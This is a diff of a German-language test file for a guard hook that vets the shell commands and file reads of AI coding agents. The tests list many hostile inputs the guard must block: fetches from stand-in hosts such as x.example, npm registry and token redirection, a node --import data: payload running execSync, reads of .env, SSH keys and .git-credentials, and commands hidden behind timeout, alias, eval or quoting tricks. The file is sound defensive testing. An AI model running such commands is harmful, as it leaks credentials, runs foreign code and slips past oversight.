@@ -78,11 +78,12 @@ test('Wächter: gefährliche Optionen erlaubter Befehle und Umleitungen sind ges
   }
 });
 
-test('Wächter: docker compose up nur mit sicherer Compose-Datei', () => {
-  const unsafe = () => ({ status: 0, stdout: '{"services":{"a":{"privileged":true}}}', stderr: '' });
-  assert.match(bashProblem('docker compose up -d', root, unsafe as never) ?? '', /privilegiert/);
+test('Wächter: docker compose up -d ist auch mit sicherer Compose-Datei gesperrt (Dienste über services.*)', () => {
+  // Der Wächter kennt keine Rolle: dieselbe Sperre gilt für jeden Agent unter ihm (auch Entwickler und Assistent).
   const safe = () => ({ status: 0, stdout: '{"services":{"a":{}}}', stderr: '' });
-  assert.equal(bashProblem('docker compose up -d', root, safe as never), null);
+  for (const command of ['docker compose up -d', 'docker compose up -d --build app', 'docker compose restart']) {
+    assert.match(bashProblem(command, root, safe as never) ?? '', /services\.restart/, command);
+  }
 });
 
 test('Wächter: versteckte Befehle, fremde Quellen und Compose-Optionen sind gesperrt', () => {
@@ -137,14 +138,69 @@ test('Wächter: versteckte Befehle, fremde Quellen und Compose-Optionen sind ges
     'git commit -m "fix (ui): klammern"',
     'npm run --prefix docs build',
     'npm install --ignore-scripts left-pad@1.3.0 @types/node',
-    'docker compose up -d --build app',
-    'docker compose restart',
-    'docker compose logs --tail=50 app',
     'git diff HEAD~1 -- src 2>/dev/null',
     'git diff main...HEAD --stat',
   ]) {
     assert.equal(bashProblem(command, root, safe as never), null, command);
   }
+});
+
+test('Wächter: git fetch/pull nur von Remotes, npm nur aus der Standard-Registry (kein Abfluss an fremde Hosts)', () => {
+  const remotes = () => ({ status: 0, stdout: 'origin\nupstream\n', stderr: '' });
+  for (const command of [
+    'git fetch https://x.example/a',
+    'git fetch "https://x.example/a"',
+    'git fetch git@host:r',
+    "git fetch 'git@host:r'",
+    'git fetch file:///tmp/repo',
+    'git fetch ext::sh',
+    'git fetch /tmp/repo',
+    'git fetch ../other',
+    'git fetch x.example:repo',
+    'git fetch -- https://x.example/a',
+    'git fetch origin https://x.example/a',
+    'git fetch evil',
+    'git fetch origin main:refs/heads/x',
+    'git pull --ff-only https://x.example/a main',
+    'git pull --ff-only "https://x.example/a" main',
+    'git pull --ff-only git@host:r main',
+    'npm ci --ignore-scripts --registry=https://x.example',
+    'npm ci --ignore-scripts "--registry=https://x.example"',
+    'npm ci --ignore-scripts --registry https://x.example',
+    'npm ci --ignore-scripts --reg=https://x.example',
+    'npm install --ignore-scripts --@scope:registry=https://x.example @scope/a',
+    'npm install --ignore-scripts --//x.example/:_authToken=abc left-pad',
+    'npm ci --ignore-scripts --proxy=http://x.example',
+    'npm ci --ignore-scripts --https-proxy=http://x.example',
+    'npm ci --ignore-scripts --noproxy=*',
+    'npm ci --ignore-scripts --replace-registry-host=always',
+    'npm_config_registry=https://x.example npm ci --ignore-scripts',
+    'npm isntall --ignore-scripts https://x.example/a.tgz',
+    'npm in --ignore-scripts git+ssh://git@x.example/r.git',
+  ]) {
+    assert.ok(bashProblem(command, root, remotes as never), command);
+  }
+  for (const command of [
+    'git fetch',
+    'git fetch origin',
+    'git fetch origin main',
+    'git fetch upstream feature/x',
+    'git fetch --prune origin',
+    'git pull --ff-only',
+    'git pull --ff-only origin main',
+    'npm ci --ignore-scripts',
+    'npm install --ignore-scripts left-pad',
+  ]) {
+    assert.equal(bashProblem(command, root, remotes as never), null, command);
+  }
+  // Ohne Abfrage der Remotes (lokales Modell) gilt nur origin.
+  assert.equal(bashProblem('git fetch origin', root, null), null);
+  assert.ok(bashProblem('git fetch upstream', root, null));
+});
+
+test('Wächter: .npmrc ist geschützt (Registry und Proxy liessen sich sonst dort umstellen)', () => {
+  assert.match(fileProblem(write('.npmrc'), all, root) ?? '', /geschützt/);
+  assert.match(fileProblem(write('frontend/.npmrc'), all, root) ?? '', /geschützt/);
 });
 
 test('Wächter als Hook: sperrt mit Exit-Code 2 und Grund, ohne gültige Richtlinie wird nichts geschrieben', () => {
@@ -160,6 +216,68 @@ test('Wächter als Hook: sperrt mit Exit-Code 2 und Grund, ohne gültige Richtli
   assert.equal(run(encodePolicy(all), write('src/x.ts')).status, 0);
   assert.equal(run('kaputt', write('src/x.ts')).status, 2);
   assert.equal(run(encodePolicy(all), { tool_name: 'Read', tool_input: { file_path: '/etc/hosts' } }).status, 0);
+  const secret = run(encodePolicy(all), { tool_name: 'Read', tool_input: { file_path: '.env' }, cwd: root });
+  assert.equal(secret.status, 2);
+  assert.match(secret.stderr, /\.env: Geheimnisse/);
+});
+
+test('Wächter: Read, Grep und Glob auf Geheimnisse sind für jede Richtlinie gesperrt, nur der Pfad wird gemeldet', () => {
+  mkdirSync(join(root, 'config'));
+  mkdirSync(join(root, 'certs'));
+  writeFileSync(join(root, '.env'), 'GEHEIM=hunter2');
+  writeFileSync(join(root, 'config', '.env.production'), 'GEHEIM=hunter2');
+  writeFileSync(join(root, 'certs', 'server.key'), 'GEHEIM=hunter2');
+  symlinkSync(join(root, '.env'), join(root, 'docs', 'notizen.txt'));
+  const readOnly: GuardPolicy = { create: false, edit: false, scopes: [], shell: false };
+  const read = (file_path: string, cwd = root) => ({ tool_name: 'Read', tool_input: { file_path }, cwd });
+  for (const policy of [readOnly, all]) {
+    for (const input of [
+      read('.env'),
+      read('config/.env.production'),
+      read('certs/server.key'),
+      read(join(root, '.env')),
+      read('../.env', join(root, 'docs')),
+      read('docs/../certs/server.key'),
+      read('docs/notizen.txt'),
+      read('CERTS/Server.KEY'),
+      read('tls/server.pem'),
+      read('~/.ssh/id_ed25519'),
+      read('/home/x/.ssh/config'),
+      read('.npmrc'),
+      read('frontend/.npmrc'),
+      read('~/.npmrc'),
+      read('~/.netrc'),
+      read('.git-credentials'),
+      read('.env.example'),
+      { tool_name: 'Grep', tool_input: { pattern: '_authToken', path: '.npmrc' }, cwd: root },
+      { tool_name: 'Grep', tool_input: { pattern: '_authToken', glob: '**/.npmrc' }, cwd: root },
+      { tool_name: 'Glob', tool_input: { pattern: '**/.npmrc' }, cwd: root },
+      { tool_name: 'NotebookRead', tool_input: { notebook_path: '.env' }, cwd: root },
+      { tool_name: 'Grep', tool_input: { pattern: 'GEHEIM', path: 'config/.env.production' }, cwd: root },
+      { tool_name: 'Grep', tool_input: { pattern: 'GEHEIM', glob: '*.{pem,key}' }, cwd: root },
+      { tool_name: 'Grep', tool_input: { pattern: 'GEHEIM', glob: '**/.env*' }, cwd: root },
+      { tool_name: 'Glob', tool_input: { pattern: 'certs/*.key' }, cwd: root },
+      { tool_name: 'Glob', tool_input: { pattern: '*', path: '.ssh' }, cwd: root },
+    ]) {
+      const problem = guardProblem(input, policy, root);
+      assert.match(problem ?? '', /Geheimnisse/, JSON.stringify(input));
+      assert.doesNotMatch(problem ?? '', /hunter2/);
+    }
+  }
+  // Kein Überblocken: gewöhnliche Dateien, Ordner und Muster bleiben lesbar.
+  for (const input of [
+    read('docs/alt.md'),
+    read('docs/env.md'),
+    read('src/environments/environment.ts'),
+    read('src/keyboard.ts'),
+    read('docs/npmrc.md'),
+    read('/etc/hosts'),
+    { tool_name: 'Grep', tool_input: { pattern: 'env', path: 'docs', glob: '*.md' }, cwd: root },
+    { tool_name: 'Grep', tool_input: { pattern: '.env' }, cwd: root },
+    { tool_name: 'Glob', tool_input: { pattern: 'src/**/*.ts' }, cwd: root },
+  ]) {
+    assert.equal(guardProblem(input, readOnly, root), null, JSON.stringify(input));
+  }
 });
 
 test('Wächter: ohne Dateipfad gesperrt; Notebook-Pfade und relative Pfade ohne cwd', () => {
@@ -195,22 +313,20 @@ test('Wächter: Umleitungen in Anführungszeichen und Befehlsketten', () => {
   assert.ok(bashProblem('git status || npx eslint', root));
   assert.ok(bashProblem('git status\ngit log --exec=x', root));
   assert.match(bashProblem('cat id_rsa', root) ?? '', /Geheimnisse/);
-  const noCheck = () => assert.fail('docker compose ps braucht keine Prüfung');
-  assert.equal(bashProblem('docker compose ps', root, noCheck as never), null);
 });
 
-test('Wächter: docker compose up wird abgelehnt, wenn die Konfiguration nicht lesbar ist', () => {
+test('Wächter: docker und launchctl ruft er nie selbst auf, sondern sperrt sie in jeder Kette', () => {
   const calls: unknown[][] = [];
-  const failing = (...args: unknown[]) => {
+  const recording = (...args: unknown[]) => {
     calls.push(args);
-    return { status: 1, stdout: '', stderr: 'no configuration file provided' };
+    return { status: 0, stdout: '', stderr: '' };
   };
   assert.match(
-    bashProblem('git status && docker compose up -d', root, failing as never) ?? '',
-    /^Start abgelehnt: docker compose config schlug fehl: no configuration file provided/,
+    bashProblem('git status && docker compose up -d', root, recording as never) ?? '',
+    /docker und launchctl sind für Agents gesperrt/,
   );
-  assert.deepEqual(calls[0]?.slice(0, 2), ['docker', ['compose', 'config', '--format', 'json']]);
-  assert.equal((calls[0]?.[2] as { cwd: string }).cwd, root);
+  assert.match(bashProblem('launchctl kickstart -k gui/501/ch.x.dev-live', root, null) ?? '', /gesperrt/);
+  assert.ok(!calls.some((call) => call[0] === 'docker'), 'kein docker-Aufruf durch den Wächter');
 });
 
 test('Richtlinie: kodieren, dekodieren und sicherer Standard', () => {
@@ -416,6 +532,54 @@ test('Wächter: Datei-Befehle aus der acceptEdits-Liste der CLI sind gesperrt, a
   }
 });
 
+test('Wächter: node nur als --version oder --check <datei>, ohne Lade-Optionen', () => {
+  for (const command of [
+    'node --check --import data:text/javascript,1 a.js',
+    'node --check -r ./x.js a.js',
+    'node --check --require=./x.js a.js',
+    'node --check=a.js',
+    'node --check a.js b.js',
+    'node -e 1',
+    'node a.js',
+    'export NODE_OPTIONS=--import=./x.js; node --check a.js',
+    // Fundfall des Auftrags und weitere Lade-Optionen, auch ohne Leerzeichen, mit = und in Anführungszeichen.
+    `node --check --import "data:text/javascript,import('node:child_process').then(c=>c.execSync('id'))" ok.js`,
+    'node --check -r ./x.js ok.js',
+    'node --check -r./x.js ok.js',
+    'node --check --import=./x.mjs ok.js',
+    'node --check --loader ./x.mjs ok.js',
+    'node --check --experimental-loader=./x.mjs ok.js',
+    'node --check "--import" ./x.mjs ok.js',
+    'node --check ok.js --import ./x.mjs',
+    'node -r ./x.js --check ok.js',
+    'node -c ok.js',
+    'node --check -',
+    'node --check',
+    // Datei muss eine relative Projektdatei sein.
+    'node --check /etc/x.js',
+    'node --check ../x.js',
+    'node --check src/../../x.js',
+    'node --check data:text/javascript,1',
+    'node --check file:///tmp/x.js',
+    'node --check $F',
+    // Umgebung und Verkettung.
+    'NODE_OPTIONS=--require=./x.js node --check ok.js',
+    'env NODE_OPTIONS=--import=./x.mjs node --check ok.js',
+    'node --check ok.js && node --import ./x.mjs ok.js',
+  ]) {
+    assert.match(bashProblem(command, root) ?? '', /gesperrt|erlaubt sind nur/, command);
+  }
+  for (const command of [
+    'node --check src/x.js',
+    'node --check src/a.js',
+    'node --check ./src/a.js',
+    'node --check "src/a b.js"',
+    'node --version',
+  ]) {
+    assert.equal(bashProblem(command, root), null, command);
+  }
+});
+
 test('Wächter: gewöhnliche Quotes bleiben erlaubt', () => {
   for (const command of [
     'git log --grep "a > b"',
@@ -483,5 +647,203 @@ test('Wächter-Tokenizer: Escapes, Fortsetzungszeilen und Shell-Konstrukte verst
     'git log --grep "a\\\\b"',
   ]) {
     assert.equal(bashProblem(command, root), null, JSON.stringify(command));
+  }
+});
+
+test('Wächter: hinter timeout, nice, stdbuf und ionice wird der eigentliche Befehl geprüft', () => {
+  for (const command of [
+    "timeout 60 sh -c 'id'",
+    'timeout 60 git push',
+    'timeout 5 nice -n 5 git push',
+    'timeout 5 nice -n 5 stdbuf -o0 git push origin main',
+    'ionice -c2 -n7 git push',
+    'stdbuf -oL npm publish',
+    'timeout -k 3 60 git push',
+    'timeout --signal=KILL 60 git reset --hard',
+    'nice -5 docker run alpine',
+    '"timeout" 60 git push',
+    '\\timeout 60 git push',
+    '/usr/bin/timeout 60 git push',
+    't""imeout 60 git push',
+    '$X 60 git push',
+    'timeout $T git push',
+    'timeout 60 $X push',
+    'timeout 60 env X=1 git status',
+    'timeout 60 rm -rf src',
+    'timeout 60 find . -exec sh {} +',
+    'timeout 60 cd .git/hooks',
+    'timeout 60 npx tsc',
+    'timeout 60 git status > x',
+  ]) {
+    assert.match(bashProblem(command, root) ?? '', /gesperrt|Wrapper|nur mit/, command);
+  }
+  // Unklare Optionen, kein Befehl dahinter oder zu tiefe Verschachtelung: gesperrt (fail-closed).
+  for (const command of [
+    'timeout git status',
+    'timeout 60',
+    'timeout --kill-after 3 60 git status',
+    'nice --wild git status',
+    'ionice -p 1',
+    'stdbuf -o $M git status',
+    'timeout 1 timeout 1 timeout 1 timeout 1 timeout 1 git status',
+  ]) {
+    assert.match(bashProblem(command, root) ?? '', /Wrapper/, command);
+  }
+  for (const command of [
+    'timeout 60 npm test',
+    'timeout 5 nice -n 5 git status',
+    'nice -n 10 npx --no-install tsx --test src/agent/agent-guard.test.ts',
+    'stdbuf -oL git log --oneline',
+    'timeout -s TERM 2m npm run typecheck',
+    'git status && timeout 30 git diff',
+  ]) {
+    assert.equal(bashProblem(command, root), null, command);
+  }
+});
+
+test('Wächter: Shell-Builtins, die spätere Befehle verändern, sind gesperrt', () => {
+  for (const command of [
+    'export GIT_DIR=/tmp/x',
+    'declare -x A=1',
+    'unset PATH',
+    'set -o allexport',
+    'alias git=sh',
+    'cd .git/hooks && git status',
+    'cd frontend',
+    'pushd /tmp',
+    'source x.sh',
+    '. ./x.sh',
+    'eval git push',
+    "trap 'id' EXIT",
+    'hash -p /bin/sh git',
+    '"cd" /tmp',
+    'git status; cd /tmp',
+  ]) {
+    assert.match(bashProblem(command, root) ?? '', /gesperrt/, command);
+  }
+});
+
+test('Wächter: awk startet über system() Programme und ist gesperrt; Abnahme-Befehle bleiben erlaubt', () => {
+  for (const command of ["awk 'BEGIN{system(x)}'", 'gawk -f x.awk', "git log | awk '{print > x}'"]) {
+    assert.match(bashProblem(command, root) ?? '', /gesperrt/, command);
+  }
+  for (const command of [
+    'npx --no-install tsx --test src/agent/agent-guard.test.ts',
+    'npm run typecheck',
+    'git fetch origin main',
+    'npm ci --ignore-scripts',
+  ]) {
+    assert.equal(bashProblem(command, root, null), null, command);
+  }
+});
+
+test('Wächter als Hook: Projektordner aus der Richtlinie geht vor CLAUDE_PROJECT_DIR und cwd', (t) => {
+  const other = mkdtempSync(join(tmpdir(), 'guard-other-'));
+  t.after(() => rmSync(other, { recursive: true, force: true }));
+  const run = (policy: string, input: object) =>
+    spawnSync(process.execPath, ['--import', import.meta.resolve('tsx'), GUARD_SCRIPT, policy], {
+      input: JSON.stringify(input),
+      encoding: 'utf8',
+      env: { ...process.env, CLAUDE_PROJECT_DIR: other },
+    });
+  const pinned = encodePolicy({ ...all, root });
+  // Ohne root in der Richtlinie gälte der fremde Ordner aus CLAUDE_PROJECT_DIR als Projekt.
+  assert.equal(run(encodePolicy(all), { ...write(join(other, 'x.md')), cwd: other }).status, 0);
+  const outside = run(pinned, { ...write(join(other, 'x.md')), cwd: other });
+  assert.equal(outside.status, 2);
+  assert.match(outside.stderr, /ausserhalb des Projektordners/);
+  assert.equal(run(pinned, write(join(root, 'docs', 'neu-hook.md'))).status, 0);
+  assert.equal(decodePolicy(pinned).root, root);
+  assert.equal(decodePolicy(encodePolicy({ ...all, root: 'relativ' })).root, undefined);
+});
+
+test('Wächter: git rm und git mv löschen bzw. benennen Dateien im Projekt um – eng geprüft', () => {
+  mkdirSync(join(root, 'migrations'));
+  writeFileSync(join(root, 'migrations', '009_a.sql'), 'x');
+  mkdirSync(join(root, 'paket', '.husky'), { recursive: true });
+  writeFileSync(join(root, 'paket', '.husky', 'pre-commit'), 'x');
+  const bash = (command: string, policy: GuardPolicy = all) =>
+    guardProblem({ tool_name: 'Bash', tool_input: { command }, cwd: root }, policy, root);
+  for (const command of [
+    'git rm migrations/009_a.sql',
+    'git rm -q -- migrations/009_a.sql',
+    'git rm --cached migrations/009_a.sql',
+    'git rm -r migrations',
+    'git mv migrations/009_a.sql migrations/011_a.sql',
+    'git mv -v migrations/009_a.sql docs',
+    'git status && git mv migrations/009_a.sql migrations/011_a.sql',
+    'timeout 30 git rm docs/alt.md',
+  ]) {
+    assert.equal(bash(command), null, command);
+  }
+  for (const command of [
+    // Ausserhalb, geschützt, das ganze Projekt
+    'git rm ../x',
+    'git rm docs/../../x',
+    'git rm /etc/hosts',
+    'git rm docs/raus/x',
+    'git rm .env',
+    'git rm .git/config',
+    'git rm -r .git',
+    'git rm .claude/settings.json',
+    'git rm -r .',
+    'git rm -r ./',
+    'git rm -r paket',
+    'git mv migrations/009_a.sql .husky/pre-commit',
+    'git mv migrations/009_a.sql .npmrc',
+    'git mv migrations/009_a.sql ../x.sql',
+    'git mv .mcp.json x.json',
+    // Optionen: -f, Abkürzungen, Pfad-Listen, unbekannte
+    'git rm -f migrations/009_a.sql',
+    'git rm --force migrations/009_a.sql',
+    'git rm -rf migrations',
+    'git rm --for migrations/009_a.sql',
+    'git rm --pathspec-from-file=liste.txt',
+    'git rm --pathspec-f=liste.txt',
+    'git rm --sparse migrations/009_a.sql',
+    'git mv -f migrations/009_a.sql docs/alt.md',
+    'git mv -k migrations/009_a.sql x',
+    'git -C .. rm x',
+    'git --git-dir=.git rm x',
+    'git -c core.x=y rm x',
+    // Pathspec-Magie, Globs, Variablen, ~
+    "git rm ':(top)x'",
+    "git rm ':!docs'",
+    "git rm ':/x'",
+    "git rm 'migrations/*.sql'",
+    'git rm migrations/*.sql',
+    "git rm 'migrations/00?_a.sql'",
+    'git rm $X',
+    'git rm ~/x',
+    'git rm {a,b}',
+    // Verstecken: Ketten, Anführungszeichen, Backslash, Wrapper
+    'git rm migrations/009_a.sql; rm x',
+    'git rm migrations/009_a.sql && mv a b',
+    'git status | cp a b',
+    'git rm $(echo x)',
+    'git "rm" x',
+    'git r\\m x',
+    "'git' rm ../x",
+    'command git rm x',
+    'env git rm x',
+    'nohup git rm x',
+    'git rm',
+    'git mv migrations/009_a.sql',
+  ]) {
+    assert.ok(bash(command), command);
+  }
+  // Rechte und Ordner-Einschränkung: Löschen braucht „Dateien ändern“, Umbenennen zusätzlich „Dateien anlegen“.
+  const editOnly = { create: false, edit: true, scopes: [] };
+  assert.equal(bash('git rm docs/alt.md', editOnly), null);
+  assert.match(bash('git mv docs/alt.md docs/neu.md', editOnly) ?? '', /Dateien anlegen/);
+  assert.match(bash('git rm docs/alt.md', { create: true, edit: false, scopes: [] }) ?? '', /Dateien ändern/);
+  const migrations = { create: true, edit: true, scopes: ['migrations'] };
+  assert.equal(bash('git mv migrations/009_a.sql migrations/011_a.sql', migrations), null);
+  assert.match(bash('git rm docs/alt.md', migrations) ?? '', /erlaubten Ordner/);
+  assert.match(bash('git mv migrations/009_a.sql docs/x.sql', migrations) ?? '', /erlaubten Ordner/);
+  // Ohne Datei-Rechte (z. B. lokales Modell ohne Richtlinie) bleiben beide gesperrt; rm, mv und cp sowieso.
+  assert.ok(bashProblem('git rm docs/alt.md', root));
+  for (const command of ['rm docs/alt.md', 'mv docs/alt.md docs/neu.md', 'cp docs/alt.md docs/neu.md']) {
+    assert.match(bash(command) ?? '', /gesperrt/, command);
   }
 });
